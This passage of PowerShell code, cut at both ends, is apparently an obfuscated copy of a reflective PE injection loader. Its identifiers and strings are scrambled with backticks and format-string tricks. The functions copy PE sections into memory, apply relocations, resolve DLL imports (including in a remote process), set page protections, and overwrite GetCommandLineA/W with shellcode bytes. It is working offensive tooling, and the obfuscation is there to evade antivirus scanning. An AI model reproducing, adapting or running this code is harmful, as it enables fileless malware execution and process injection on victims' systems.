			if (${s`Ec`TionHe`AdeR}."p`oiNTERTor`Aw`d`ATa" -eq 0)
			{
				${si`Z`Eof`RAw`dATA} = 0
			}
			
			if (${SiZ`EOfRAW`daTA} -gt ${sE`cTIO`Nhe`ADER}."V`irtUAlS`IZe")
			{
				${si`ZE`oFR`AwdaTA} = ${sE`ct`Ion`hE`ADer}."V`IrTuALSI`ZE"
			}
			
			if (${s`IZ`EoFRAwDa`Ta} -gt 0)
			{
				&("{5}{6}{3}{1}{0}{4}{2}"-f 'nge','a','alid','MemoryR','V','Te','st-') -DebugString (("{1}{2}{0}"-f 'c','Copy-S','e')+'t'+'ion'+'s::'+("{1}{0}" -f'ars','M')+'h'+("{2}{0}{1}" -f 'Co','py','al')) -PEInfo ${pE`iNfO} -StartAddress ${secTiO`N`dEstADDR} -Size ${siz`EO`FraWdaTA} | &("{1}{2}{0}"-f 'll','Out-N','u')
				[System.Runtime.InteropServices.Marshal]::"c`Opy"(${peByt`es}, [Int32]${S`e`CT`IOnheA`deR}."P`oInteR`TorAw`dA`TA", ${SE`cti`oNd`est`ADdr}, ${SiZEOF`RAw`d`ATA})
			}
		
			
			if (${s`EctION`He`AD`eR}."size`Ofraw`daTA" -lt ${sec`TIO`NhEAD`Er}."vIrt`U`AlS`iZE")
			{
				${d`IFfE`RENCe} = ${SE`c`TIOnh`EadER}."V`ir`TuAlsIzE" - ${siZEoF`RA`WD`ATA}
				[IntPtr]${St`A`RTaDdr`Ess} = [IntPtr](&("{5}{1}{3}{2}{4}{0}"-f'ed','-Signe','In','d','tAsUnsign','Add') ([Int64]${SE`Cti`ONdES`Ta`ddR}) ([Int64]${s`iZeo`Fra`WD`Ata}))
				&("{2}{1}{3}{0}{4}" -f'ryRangeVali','es','T','t-Memo','d') -DebugString (("{2}{1}{0}"-f 'e','S','Copy-')+("{0}{2}{1}"-f 'ct',':','ions:')+("{1}{0}" -f 'emse','M')+'t') -PEInfo ${pe`i`NFo} -StartAddress ${stArt`Ad`d`RESs} -Size ${dI`FfE`ReN`cE} | &("{1}{0}" -f 'Null','Out-')
				${wiN3`2FU`NCt`IOns}."MeMs`et"."I`NvOkE"(${S`T`ARtaDD`RESs}, 0, [IntPtr]${d`iFFEr`EN`cE}) | &("{0}{2}{1}"-f 'O','ull','ut-N')
			}
		}
	}


	Function UPDATe`-ME`MORYa`DDR`e`sseS
	{
		Param(
		[Parameter(poSItion = 0, MANdaTORy = ${TR`UE})]
		[System.Object]
		${p`ein`Fo},
		
		[Parameter(pOsitiON = 1, MandatOry = ${tR`UE})]
		[Int64]
		${OR`IGINAl`i`magEbA`se},
		
		[Parameter(posITion = 2, manDAtOrY = ${T`RUE})]
		[System.Object]
		${W`i`N32COnsta`NTs},
		
		[Parameter(POsitiON = 3, MandAtoRy = ${T`Rue})]
		[System.Object]
		${wI`N32`TyPes}
		)
		
		[Int64]${b`ASeD`IF`FER`Ence} = 0
		${aDd`DI`F`FEREncE} = ${tR`UE} 
		[UInt32]${ImaGEb`ASe`RelOc`s`iZE} = [System.Runtime.InteropServices.Marshal]::"sIz`Eof"([Type]${wIn32t`YP`Es}."i`maGE_b`A`sE_rel`oCAtioN")
		
		
		if ((${oRIG`i`NalImAgeb`ASE} -eq [Int64]${Pei`N`Fo}."EFF`EC`TIvepeH`ANDlE") `
				-or (${Pe`in`FO}."iMAGE_NT_h`e`A`DE`Rs"."oP`TIoN`ALHE`A`Der"."B`AsEReL`oc`AtIoNTabLe"."si`ze" -eq 0))
		{
			return
		}


		elseif ((&("{3}{4}{0}{6}{5}{2}{1}"-f'reaterTh','UInt','s','Compare','-Val1G','nVal2A','a') (${ORigin`A`Li`mA`gE`BASe}) (${pE`i`Nfo}."effect`IV`EPEHaNd`Le")) -eq ${tR`Ue})
		{
			${BaseD`i`FfeRe`N`Ce} = &("{1}{3}{2}{4}{0}" -f 'ed','Su','nsi','b-SignedIntAsU','gn') (${oRIGin`A`LI`ma`GeBaSe}) (${pe`I`NFO}."EffE`cTI`VEPeH`ANDLE")
			${A`DdDi`F`F`ERencE} = ${f`AlSE}
		}
		elseif ((&("{6}{5}{2}{3}{4}{0}{1}"-f'a','l2AsUInt','a','t','erThanV','e-Val1Gre','Compar') (${P`EInfO}."efF`E`cT`iV`epeh`AndLe") (${O`R`IG`INaliMAgE`Ba`sE})) -eq ${tR`Ue})
		{
			${b`A`SE`d`iFferenCe} = &("{1}{3}{2}{0}" -f'dIntAsUnsigned','Sub-','gne','Si') (${PeI`Nfo}."Effe`Ct`IVeP`e`HAnd`le") (${ORIgInA`li`MA`ge`BASE})
		}
		
		
		[IntPtr]${bAsE`R`ElOC`PTR} = [IntPtr](&("{1}{5}{3}{4}{0}{6}{2}"-f'ntAsU','Add','ned','d','I','-Signe','nsig') ([Int64]${Pe`IN`Fo}."PeHan`dlE") ([Int64]${p`eiN`Fo}."IMAg`e`_nT_`Hea`Ders"."op`T`Io`NA`LHEaDeR"."baS`er`elOcAT`i`oNTab`lE"."VI`RTUA`lADd`R`ESS"))
		while(${T`RUe})
		{
			
			${BA`s`er`EL`oCatioNTablE} = [System.Runtime.InteropServices.Marshal]::"pt`RtOStR`Uc`TURE"(${Ba`SE`R`eLOCp`Tr}, [Type]${wiN`3`2T`YpeS}."iMage_B`A`se_REl`o`Ca`Ti`On")

			if (${bA`seRElOC`A`TioNt`AB`LE}."siZEoFBl`O`ck" -eq 0)
			{
				break
			}

			[IntPtr]${MeM`Ad`D`RBaSE} = [IntPtr](&("{1}{5}{3}{2}{0}{4}{7}{6}"-f'I','Add-','gned','i','ntA','S','d','sUnsigne') ([Int64]${p`eI`NFO}."peha`ND`LE") ([Int64]${bASere`lOc`At`iONt`A`Ble}."ViRTU`AL`AD`DR`ess"))
			${N`U`m`RE`locaTIoNs} = (${ba`seRELo`cationt`ABLE}."siz`e`ofBl`Ock" - ${IMAgeBa`s`ErElocS`IZe}) / 2

			
			for(${i} = 0; ${i} -lt ${NUM`RELoCA`TIO`Ns}; ${i}++)
			{
				
				${R`eloc`At`Io`NINFoPtr} = [IntPtr](&("{2}{0}{4}{1}{3}"-f'Si','ed','Add-','IntAsUnsigned','gn') ([IntPtr]${B`ASEr`eL`oCPTr}) ([Int64]${I`m`AGE`Ba`seRELoCSiZe} + (2 * ${i})))
				[UInt16]${reLOcATio`NIn`Fo} = [System.Runtime.InteropServices.Marshal]::"P`TrTOST`Ru`c`TURE"(${rEL`oc`AtI`o`N`iNFopTr}, [Type][UInt16])

				
				[UInt16]${relOCo`FF`sEt} = ${reLOCatIo`NI`N`FO} -band 0x0FFF
				[UInt16]${r`EL`o`cTypE} = ${r`eLOcaTi`o`N`info} -band 0xF000
				for (${j} = 0; ${J} -lt 12; ${j}++)
				{
					${rE`lOct`y`pe} = [Math]::('Flo'+'or').Invoke(${re`lO`CtyPE} / 2)
				}

				
				
				
				if ((${R`ElOc`TY`PE} -eq ${W`in`32CO`NSTANts}."i`MAGE`_Rel_bA`sE`D_h`igH`Low") `
						-or (${ReL`OC`TYpE} -eq ${wi`N`32Con`S`TaNTS}."IMag`E_R`el_bA`s`E`d_diR64"))
				{			
					
					[IntPtr]${f`I`NaLAD`Dr} = [IntPtr](&("{2}{3}{5}{1}{4}{0}{7}{6}"-f'g','U','Add-','SignedIn','nsi','tAs','d','ne') ([Int64]${m`Emadd`RBase}) ([Int64]${r`eloC`Of`Fset}))
					[IntPtr]${cu`RRa`ddr} = [System.Runtime.InteropServices.Marshal]::"Ptr`TOS`TruCT`U`RE"(${f`i`NalaDdr}, [Type][IntPtr])
		
					if (${addD`if`FEREnce} -eq ${t`Rue})
					{
						[IntPtr]${C`URrAd`dR} = [IntPtr](&("{1}{4}{3}{0}{2}" -f'IntAsUnsigne','Ad','d','-Signed','d') ([Int64]${c`Ur`RADdr}) (${bASe`DIFfe`R`encE}))
					}
					else
					{
						[IntPtr]${C`URRA`dDR} = [IntPtr](&("{2}{4}{1}{0}{3}"-f 'tAsUns','In','Su','igned','b-Signed') ([Int64]${CURR`Ad`Dr}) (${baSeD`iff`eR`en`cE}))
					}				

					[System.Runtime.InteropServices.Marshal]::('St'+'ru'+'ct'+'ureToP'+'tr').Invoke(${C`URRAd`DR}, ${fIn`Ala`D`dR}, ${F`A`Lse}) | &("{1}{0}{2}"-f'N','Out-','ull')
				}
				elseif (${rELOCt`Y`pe} -ne ${wiN3`2CON`S`TaNTs}."IMAgE`_rEl`_Ba`sE`D_`ABSolUTe")
				{
					
					Throw (("{1}{0}"-f'ow','Unkn')+'n'+' '+'rel'+("{0}{1}{2}"-f'o','catio','n')+' '+'f'+("{1}{0}"-f'und, ','o')+("{0}{1}"-f 're','lo')+'ca'+("{0}{1}" -f 't','ion ')+'val'+'u'+'e: '+("$RelocType, "+'')+'r'+("{0}{1}"-f 'e','locat')+'ion'+'in'+("{1}{0}"-f' ','fo:')+"$RelocationInfo")
				}
			}
			
			${Bas`EreLoC`pTR} = [IntPtr](&("{1}{3}{4}{0}{2}"-f 'gn','A','ed','dd-SignedIntAs','Unsi') ([Int64]${basEr`el`OcptR}) ([Int64]${B`AsERE`LoC`ATI`oNTab`lE}."s`izEo`FBLOck"))
		}
	}


	Function Imp`o`RT`-dLLiMporTS
	{
		Param(
		[Parameter(poSiTIoN = 0, ManDatory = ${tR`UE})]
		[System.Object]
		${PE`IN`Fo},
		
		[Parameter(pOsitiON = 1, manDatorY = ${Tr`Ue})]
		[System.Object]
		${wIN32FUn`CT`io`NS},
		
		[Parameter(posItIon = 2, maNdaToRy = ${Tr`UE})]
		[System.Object]
		${Wi`N`32Ty`pes},
		
		[Parameter(POsItIon = 3, MandATory = ${T`RuE})]
		[System.Object]
		${WI`N`3`2ConSTaNts},
		
		[Parameter(posItiOn = 4, MANdaTory = ${FA`lSe})]
		[IntPtr]
		${ReMoTeP`R`OChAND`LE}
		)
		
		${rE`M`oT`ELoAdInG} = ${faL`Se}
		if (${Pei`Nfo}."pEHaND`LE" -ne ${PE`inFo}."e`FFE`ct`IVe`pEh`AnDLe")
		{
			${rEM`o`TeLO`Adi`NG} = ${tr`UE}
		}
		
		if (${pE`I`Nfo}."ImAGE_`Nt_hE`AD`Ers"."o`PtIon`AL`hEADer"."i`MPORTT`AblE"."S`Ize" -gt 0)
		{
			[IntPtr]${iM`PORT`d`EsCr`IpT`orPtR} = &("{2}{0}{3}{4}{5}{1}"-f'd-Signe','ned','Ad','dIn','tAsU','nsig') ([Int64]${P`e`INFO}."p`Eha`NDle") ([Int64]${pe`i`NFo}."iMaGE_nT`_`H`eA`derS"."opTIoNAl`heaD`ER"."IM`PoR`TtabLE"."virTu`A`LADdREss")
			
			while (${TR`Ue})
			{
				${imPoR`T`DeSCR`i`pTOr} = [System.Runtime.InteropServices.Marshal]::"ptRTo`Str`UCtuRe"(${IMp`oRtDeS`CRIPtORP`Tr}, [Type]${wIn3`2`TypeS}."IMaG`e`_IM`Po`Rt`_de`SCrIPTor")
				
				
				if (${IM`pO`RT`d`ESCrip`TOr}."chaRa`cTE`R`Ist`IcS" -eq 0 `
						-and ${ImpOr`T`D`escR`I`PToR}."fIRs`T`Thu`NK" -eq 0 `
						-and ${i`MPO`RT`DE`ScRi`ptor}."fo`RW`A`R`DErCHAIN" -eq 0 `
						-and ${iM`p`o`RT`DeScrIpToR}."NA`Me" -eq 0 `
						-and ${imPO`RTd`esC`RipToR}."tIME`DAtest`AmP" -eq 0)
				{
					&("{1}{3}{2}{0}" -f 'bose','Wri','e-Ver','t') (("{1}{0}{2}" -f 'one i','D','mpor')+'tin'+("{0}{1}"-f 'g ','DL')+'L '+'i'+("{1}{2}{0}"-f'ts','mpo','r'))
					break
				}

				${IM`P`orTDllhA`N`dLE} = [IntPtr]::"Z`ERo"
				${ImpoR`T`DLLPa`Th`pTr} = (&("{5}{3}{0}{2}{1}{4}"-f'SignedI','AsUnsig','nt','-','ned','Add') ([Int64]${Pein`Fo}."pE`Ha`NdlE") ([Int64]${I`M`P`Or`TDEs`cRIPTOr}."N`AME"))
				${iMpoR`T`D`l`lpaTh} = [System.Runtime.InteropServices.Marshal]::('P'+'trToS'+'trin'+'g'+'Ansi').Invoke(${im`Po`RtDllpAT`H`ptr})
				
				if (${re`MO`TE`LOading} -eq ${t`RUE})
				{
					${impO`RtDLL`h`AN`dle} = &("{5}{4}{1}{3}{0}{2}" -f 'otePro','InR','cess','em','mport-Dll','I') -RemoteProcHandle ${rE`mOtePrOCh`An`dLe} -ImportDllPathPtr ${i`m`P`o`RtDlLpaThPtr}
				}
				else
				{
					${Imp`ORtd`l`L`hANdle} = ${wi`N32Fu`NCTI`Ons}."lo`AD`l`iBrary"."INV`Oke"(${i`MpOrtd`lLp`ATH})
				}

				if ((${I`MPORt`dlL`han`DlE} -eq ${N`ULl}) -or (${Im`P`OrTDL`Lh`ANDle} -eq [IntPtr]::"ze`Ro"))
				{
					throw ('Err'+'or '+("{1}{0}" -f 'o','imp')+'rti'+'ng '+'DLL'+', '+'D'+'LL'+("{2}{1}{0}"-f ' ','e:','Nam')+"$ImportDllPath")
				}
				
				
				[IntPtr]${T`huNK`R`EF} = &("{4}{2}{3}{0}{1}" -f'Un','signed','edInt','As','Add-Sign') (${P`EInFo}."P`eHan`Dle") (${IM`PO`Rt`D`EScriPTOR}."F`IRsT`Thu`NK")
				[IntPtr]${oRIgINAlt`h`U`NkRef} = &("{3}{0}{2}{4}{1}{5}"-f 'd-','nedIntA','Si','Ad','g','sUnsigned') (${pEi`Nfo}."pE`h`AnDLe") (${IMPORTD`eSCri`pT`oR}."C`harAC`T`ER`istics") 
				[IntPtr]${ORI`GIn`AltHunk`R`efvAL} = [System.Runtime.InteropServices.Marshal]::"p`T`RtO`ST`RUCTuRE"(${oriGina`lT`HUn`k`REf}, [Type][IntPtr])
				
				while (${o`RigI`NAlthU`NK`REfvAL} -ne [IntPtr]::"Z`ero")
				{
					${PRocE`d`UrE`NAMe} = ''
					
					
					
					[IntPtr]${newT`h`UNkReF} = [IntPtr]::"ZE`RO"
					if([Int64]${ori`giNa`lThUnKRE`FVaL} -lt 0)
					{
						${pr`Oce`durenAmE} = [Int64]${oRigiN`AL`Th`U`NkReFV`Al} -band 0xffff 
					}
					else
					{
						[IntPtr]${sTr`ing`Addr} = &("{1}{4}{2}{0}{3}"-f 'Unsi','Add-','s','gned','SignedIntA') (${P`einFo}."P`eHand`le") (${oRiGIn`AlthUN`k`RE`FVal})
						${ST`Ri`Nga`Ddr} = &("{0}{6}{4}{1}{2}{5}{3}{7}" -f'Add-','IntAsUn','si','n','gned','g','Si','ed') ${StRIN`gA`ddR} ([System.Runtime.InteropServices.Marshal]::"S`IzeOF"([Type][UInt16]))
						${PRoced`URe`N`Ame} = [System.Runtime.InteropServices.Marshal]::('PtrToSt'+'ring'+'Ansi').Invoke(${st`RINg`AdDr})
					}
					
					if (${REmO`T`eLoaDINg} -eq ${Tr`Ue})
					{
						[IntPtr]${nE`WtH`UnKRef} = &("{1}{2}{0}{4}{3}" -f 'tePro','Get-Re','mo','ss','cAddre') -RemoteProcHandle ${Re`MoTePRocHa`Nd`lE} -RemoteDllHandle ${imPoRT`dLl`h`A`NdLe} -FunctionName ${P`ROCEdU`REnAmE}
					}
					else
					{
						if(${P`RoCe`DUReNa`Me} -is [string])
						{
						    [IntPtr]${N`E`wtHUnkr`Ef} = ${w`In32fUnc`T`IOns}."ge`TprO`CA`d`dRESs"."InVo`ke"(${IMpO`RTDllHAn`d`lE}, ${p`R`ocEDure`NaME})
						}
						else
						{
						    [IntPtr]${newThu`N`K`REf} = ${WI`N3`2FuNcTions}."gE`TProC`Ad`DrEss`OrdinAl"."IN`Voke"(${i`mpORtd`LL`hA`NDLE}, ${PR`OcE`d`Ur`EnAME})
						}
					}
					
					if (${NewT`HU`NkrEF} -eq ${n`ULl} -or ${nEwT`hUnKr`ef} -eq [IntPtr]::"zE`Ro")
					{
						Throw ('N'+'ew '+("{1}{0}"-f 'ti','func')+'on'+' '+'r'+("{0}{1}" -f 'ef','er')+("{1}{0}" -f 'ce ','en')+'i'+'s '+("{1}{0}"-f 'l,','nul')+' '+'thi'+'s '+'i'+'s '+'alm'+'ost'+' '+'c'+("{1}{2}{0}"-f'inl','er','ta')+'y '+'a '+'b'+'ug '+'in'+' '+'thi'+'s '+'s'+'c'+("{1}{0}"-f 'pt. ','ri')+("{1}{0}"-f 'nct','Fu')+'i'+'on:'+' '+("$ProcedureName. "+'')+("{0}{1}" -f 'D','ll:')+' '+"$ImportDllPath")
					}

					[System.Runtime.InteropServices.Marshal]::('Struct'+'ureT'+'o'+'P'+'tr').Invoke(${n`ewtHUN`kRef}, ${tHuNKR`ef}, ${FAL`Se})
					
					${Th`UNK`REf} = &("{3}{2}{0}{1}{4}" -f 'gn','edIntAsU','d-Si','Ad','nsigned') ([Int64]${T`hunK`ReF}) ([System.Runtime.InteropServices.Marshal]::"Si`ze`of"([Type][IntPtr]))
					[IntPtr]${OR`iGI`N`ALTh`UNkReF} = &("{1}{0}{4}{2}{3}"-f'd','A','-SignedIntAsU','nsigned','d') ([Int64]${OriG`iNALT`HUN`Kref}) ([System.Runtime.InteropServices.Marshal]::"sI`ZEof"([Type][IntPtr]))
					[IntPtr]${oRIG`I`NAlt`hu`NKREfVAL} = [System.Runtime.InteropServices.Marshal]::"pTr`TOStRU`C`TUrE"(${oRIgi`NALT`hU`N`Kr`EF}, [Type][IntPtr])
				}
				
				${Im`POr`TDEScriP`TO`Rptr} = &("{3}{4}{0}{5}{1}{6}{2}"-f '-Si','dIntAsUnsig','d','A','dd','gne','ne') (${IM`pOrtDeS`c`RIP`TOrPtR}) ([System.Runtime.InteropServices.Marshal]::"siZ`eoF"([Type]${w`in3`2`TyPes}."imAge_IM`poRT_`d`Esc`RIptOR"))
			}
		}
	}

	Function GEt-vI`R`TuAL`Prot`ect`VAluE
	{
		Param(
		[Parameter(PosItIon = 0, maNDaTOry = ${TR`Ue})]
		[UInt32]
		${SeCt`I`oN`CHARA`Ct`erIsticS}
		)
		
		${p`RotECTiON`F`LAG} = 0x0
		if ((${S`ECTIo`NCH`AraCt`eriST`iCS} -band ${WIn32`c`oN`STAntS}."im`Age`_`SCn_`mem_`EXeCU`Te") -gt 0)
		{
			if ((${SeCtIoN`Ch`ArAcTE`RIstics} -band ${wI`N32C`OnS`TaNTs}."imAGE`_sc`N_Me`M_reaD") -gt 0)
			{
				if ((${sEc`TIo`Nc`hAracT`ERIs`T`Ics} -band ${wIN32coN`S`T`Ants}."IMa`GE`_Sc`N_mEM_w`R`ITe") -gt 0)
				{
					${P`Ro`TeCTIO`NFl`Ag} = ${wI`N32CoNS`Ta`NTs}."PA`g`E_e`X`Ec`Ute_ReAdwRI`Te"
				}
				else
				{
					${P`R`OTECTIONF`LAg} = ${WIN32`CoNS`T`AntS}."pA`G`E`_`ExeCUTE_READ"
				}
			}
			else
			{
				if ((${SEcTion`ChA`Ra`c`T`ErIsTi`CS} -band ${WiN32cO`NSta`NTs}."Ima`G`E`_sCN_mem`_w`RI`TE") -gt 0)
				{
					${prOtec`Ti`o`NflAG} = ${wIN`3`2coNSTAnTS}."PaGe`_eX`ecu`Te_wrIte`cOpY"
				}
				else
				{
					${ProTe`cti`o`N`FLAg} = ${wiN`3`2`COnS`TANtS}."PAge`_`EX`Ecute"
				}
			}
		}
		else
		{
			if ((${SecT`iO`N`ChaR`ACter`Ist`ICs} -band ${wiN3`2coN`S`TA`NTs}."iM`AG`E_SCn_mEm_`Read") -gt 0)
			{
				if ((${s`EctIoNcHA`R`ACtEris`TiCs} -band ${wi`N32`COn`staN`TS}."imagE`_scN_m`E`M_wRi`Te") -gt 0)
				{
					${p`Rot`ECTionf`LaG} = ${WIN3`2c`on`STA`Nts}."pA`g`E_`ReAdW`RiTe"
				}
				else
				{
					${P`ROTEction`F`L`AG} = ${W`iN`32COn`staNts}."p`AgE_`ReADO`NLY"
				}
			}
			else
			{
				if ((${sEC`TioNCHa`R`A`CTerIStics} -band ${WiN`32c`o`N`sTAnts}."i`MaGE_ScN_`M`Em_`W`RIte") -gt 0)
				{
					${prOTEC`T`IonfL`Ag} = ${Wi`N`32COn`sta`NTS}."p`A`ge_WrITEc`opy"
				}
				else
				{
					${prOtec`TIon`Fl`Ag} = ${w`IN`32`CO`NstANTS}."PA`gE_`NOAC`Cess"
				}
			}
		}
		
		if ((${seC`Ti`ONCHArA`c`Ter`IS`TiCs} -band ${Wi`N32con`staN`Ts}."I`MaGE_sC`N`_mEm_nO`T_cAc`HEd") -gt 0)
		{
			${PrOt`Ec`T`ION`Flag} = ${pr`oT`eC`TiOnFLAG} -bor ${WIN`32C`onS`TANts}."P`A`GE_nocAc`he"
		}
		
		return ${PROTeC`Ti`ON`F`LAG}
	}

	Function Up`dA`TE`-m`EMOry`prOtecTIonFLAgS
	{
		Param(
		[Parameter(posITioN = 0, MaNdatoRY = ${Tr`Ue})]
		[System.Object]
		${P`EiNFO},
		
		[Parameter(pOSiTION = 1, mAndatORy = ${t`RUe})]
		[System.Object]
		${Wi`N32FU`NC`T`ioNS},
		
		[Parameter(poSiTIOn = 2, mandaTORY = ${T`RuE})]
		[System.Object]
		${wIN32Co`N`sTa`NtS},
		
		[Parameter(poSITiON = 3, MANDaTorY = ${T`Rue})]
		[System.Object]
		${WI`N`32tyPEs}
		)
		
		for( ${i} = 0; ${i} -lt ${pe`InFO}."iMA`Ge`_nt_h`eadE`Rs"."fIl`eHEA`DER"."NumbErO`F`sECt`Ions"; ${I}++)
		{
			[IntPtr]${S`EcT`IONhEAd`erptr} = [IntPtr](&("{0}{6}{2}{5}{3}{1}{4}"-f 'Add-','Unsigne','igne','ntAs','d','dI','S') ([Int64]${pE`iNfO}."SeCt`ionH`EAdErp`TR") (${i} * [System.Runtime.InteropServices.Marshal]::"sI`zeOF"([Type]${WI`N32`Ty`pES}."ImaG`e`_`sEC`TIoN_h`eaDer")))
			${SecTI`o`NH`EAd`ER} = [System.Runtime.InteropServices.Marshal]::"pTRt`OsTRu`cT`U`Re"(${SEcT`ionH`EADER`PTR}, [Type]${wI`N32`TYPES}."ImAgE_`SeCT`io`N_heaD`eR")
			[IntPtr]${seCt`i`oNPTr} = &("{5}{1}{0}{2}{4}{6}{3}" -f 'dIntAs','-Signe','U','ed','n','Add','sign') (${pE`inFO}."Peh`An`DLe") (${Se`Ct`I`ONH`EaDEr}."vIrtUal`AdDR`EsS")
			
			[UInt32]${prot`eCtF`l`AG} = &("{2}{3}{1}{4}{0}{5}" -f 'ctValu','a','Get-Vir','tu','lProte','e') ${SECt`iON`heADeR}."C`H`AR`AcTeris`TiCs"
			[UInt32]${SECT`I`o`NSiZe} = ${Se`Cti`o`NheAD`er}."VI`RTU`ALS`IZe"
			
			[UInt32]${OLDPrOTeCT`F`l`AG} = 0
			&("{3}{4}{1}{0}{2}" -f'eV','ng','alid','Test-MemoryR','a') -DebugString ('U'+'p'+("{0}{1}{2}{4}{3}" -f 'date','-M','emoryProte','o','cti')+("{1}{0}" -f 'Fla','n')+("{0}{2}{1}" -f 'g','ir','s::V')+'t'+("{2}{0}{1}" -f'lPr','o','ua')+'te'+'ct') -PEInfo ${pei`NFo} -StartAddress ${SEcTi`o`Nptr} -Size ${sect`io`NSIZE} | &("{0}{1}{2}"-f'O','ut','-Null')
			${suC`c`eSs} = ${wIN32`FUNc`TIO`Ns}."VI`RTUALP`ROT`E`ct"."In`VOke"(${SeC`Ti`OnPtr}, ${S`E`CTIONs`IZE}, ${prO`Te`CTF`lAG}, [Ref]${oldP`RoTecT`FL`AG})
			if (${SuC`c`ess} -eq ${fa`L`se})
			{
				Throw ('Un'+'abl'+'e'+' t'+("{1}{0}"-f'chang','o ')+("{1}{0}" -f'mory','e me')+("{2}{1}{0}" -f 'ec','prot',' ')+("{0}{1}"-f 'tio','n'))
			}
		}
	}
	
	
	
	Function Up`D`ATE-e`X`EfU`NcTIonS
	{
		Param(
		[Parameter(POSiTion = 0, mANdatoRY = ${Tr`Ue})]
		[System.Object]
		${P`EIn`FO},
		
		[Parameter(POSItiON = 1, maNdaTOry = ${tr`Ue})]
		[System.Object]
		${wIN`32fuNc`TIO`NS},
		
		[Parameter(pOsItion = 2, mANdatORY = ${TR`UE})]
		[System.Object]
		${Wi`N3`2CoNsT`A`NtS},
		
		[Parameter(POSITIon = 3, MaNDatoRY = ${T`RUe})]
		[String]
		${EXEAR`GU`Men`Ts},
		
		[Parameter(POsITIoN = 4, maNDATORY = ${t`RuE})]
		[IntPtr]
		${EXe`d`O`Ne`BytEpTR}
		)
		
		
		${rE`T`URna`RrAY} = @() 
		
		${PTr`Size} = [System.Runtime.InteropServices.Marshal]::"s`izEoF"([Type][IntPtr])
		[UInt32]${oLDp`RoTeCtF`L`AG} = 0
		
		[IntPtr]${KeRnel32H`A`N`Dle} = ${w`in32F`UNCTI`onS}."GE`Tm`odUlEh`ANdLe"."invo`KE"(('Ker'+'n'+("{1}{0}" -f'32.d','el')+'ll'))
		if (${kER`NEl`32h`AnDLE} -eq [IntPtr]::"Ze`Ro")
		{
			throw ('Ke'+("{0}{1}"-f 'r','nel')+("{1}{2}{0}" -f 'nd','32 ','ha')+("{2}{0}{1}"-f 'ul','l','le n'))
		}
		
		[IntPtr]${K`E`R`NeLbas`EhaN`dLe} = ${wIN`32f`UNcT`IONs}."G`e`TmODUlE`HAndlE"."iNV`O`ke"((("{1}{0}" -f 'e','Kern')+'lB'+'as'+'e.'+'dll'))
		if (${kernE`LB`AsEhA`N`d`Le} -eq [IntPtr]::"z`Ero")
		{
			throw (("{1}{0}" -f 'rne','Ke')+'lB'+("{0}{1}"-f 'a','se han')+'d'+'l'+'e '+("{0}{1}"-f 'n','ull'))
		}

		
		
		
		${CM`DLinew`A`Rg`SPtR} = [System.Runtime.InteropServices.Marshal]::('St'+'ringToHG'+'lo'+'balUni').Invoke(${ex`eaRGu`mE`Nts})
		${C`MdlINe`AaRg`sPTR} = [System.Runtime.InteropServices.Marshal]::('String'+'To'+'HG'+'lo'+'bal'+'Ansi').Invoke(${e`XEA`RGUm`ents})
	
		[IntPtr]${GET`CO`MMAnDL`IN`EA`Addr} = ${Wi`N32f`Un`C`TioNs}."Ge`TprOcad`DrE`SS"."iNVO`Ke"(${kerneL`BASeh`ANd`Le}, ('G'+("{1}{2}{0}" -f'mandLi','e','tCom')+'neA'))
		[IntPtr]${GetcOMmaNdlInE`w`A`ddR} = ${Wi`N32f`Unc`T`Ions}."gET`prOcADd`R`ess"."iN`Voke"(${KE`RN`ElBaSe`HaNd`LE}, (("{0}{2}{1}"-f'Ge','omm','tC')+'a'+("{0}{1}" -f'n','dLi')+'n'+'eW'))

		if (${Ge`Tc`O`MmAN`D`LiNeA`ADDr} -eq [IntPtr]::"z`ero" -or ${geT`c`OMMa`N`DLiNEWaDdr} -eq [IntPtr]::"Ze`Ro")
		{
			throw (("{0}{1}"-f 'Get','C')+'o'+("{1}{2}{0}"-f'ne ','mmandL','i')+'pt'+'r '+'nu'+("{0}{1}" -f 'll.',' ')+'Get'+'Co'+("{0}{1}{2}" -f 'mm','andLi','n')+("{1}{0}"-f'A: ','e')+("$GetCommandLineAAddr. "+'')+'G'+("{0}{2}{1}" -f'e','Comman','t')+'dLi'+'neW'+': '+"$GetCommandLineWAddr")
		}

		
		[Byte[]]${Sh`e`lL`codE1} = @()
		if (${PTR`SI`zE} -eq 8)
		{
			${S`hell`CODE1} += 0x48	
		}
		${sHEll`C`oDE1} += 0xb8
		
		[Byte[]]${S`heLlcoD`e2} = @(0xc3)
		${T`o`TaLSIzE} = ${S`heL`L`code1}."l`ENg`Th" + ${P`TR`sIzE} + ${SH`ElLCod`e2}."leNg`Th"
		
		
		
		${GeTComMaNDl`i`N`e`Ao`R`igbYtES`PtR} = [System.Runtime.InteropServices.Marshal]::('All'+'o'+'cHG'+'lobal').Invoke(${tOt`Al`Size})
		${GeTcoMM`ANDl`iNe`worigbYT`ESptr} = [System.Runtime.InteropServices.Marshal]::('Al'+'locHGlob'+'al').Invoke(${t`Ot`AlS`izE})
		${W`IN`32fuNCT`iOnS}."M`e`mcPY"."InVo`KE"(${GeTCOMMa`NDlinEAOriG`BYT`eSP`Tr}, ${G`eTCOMmA`NDl`INEAaDdr}, [UInt64]${TOtA`LSi`ZE}) | &("{0}{2}{1}" -f'Out-','ll','Nu')
		${wiN32`FUn`cT`io`NS}."me`McpY"."INV`O`kE"(${gEtcOm`MA`Ndl`iNew`oR`IGb`YTESPtr}, ${g`EtcOmM`AndlINE`WAd`DR}, [UInt64]${t`otalSI`ZE}) | &("{0}{1}" -f'O','ut-Null')
		${rEt`Urna`RRAy} += ,(${G`eT`cOM`MandlinEAa`ddr}, ${gEtCom`Mand`Line`A`Orig`ByteSp`Tr}, ${TO`TA`lSi`ZE})
		${rETu`R`N`ARRAY} += ,(${ge`TcoMmA`N`DlinEWADdr}, ${Ge`TcO`MMAnD`LInEwORI`g`B`yt`EsP`Tr}, ${ToTA`LSI`Ze})

		
		[UInt32]${OL`d`p`RotEct`FLaG} = 0
		${sUCCE`Ss} = ${wi`N32FU`N`CT`Ions}."VI`RTu`ALPROtect"."in`VO`KE"(${Ge`TCOMm`An`DliNea`A`dDr}, [UInt32]${T`Ot`AlSizE}, [UInt32](${Wi`N3`2CONSTaN`TS}."P`AGe_eXecuTE`_`ReA`dWRI`Te"), [Ref]${OlDP`RO`TEctf`LaG})
		if (${SuCC`ess} = ${F`A`LSe})
		{
			throw ('C'+'a'+'ll'+("{2}{1}{3}{4}{0}"-f 'o','to ',' ','Virtual','Pr')+'t'+'e'+("{1}{0}{2}"-f'fa','ct ','i')+'l'+'ed')
		}
		
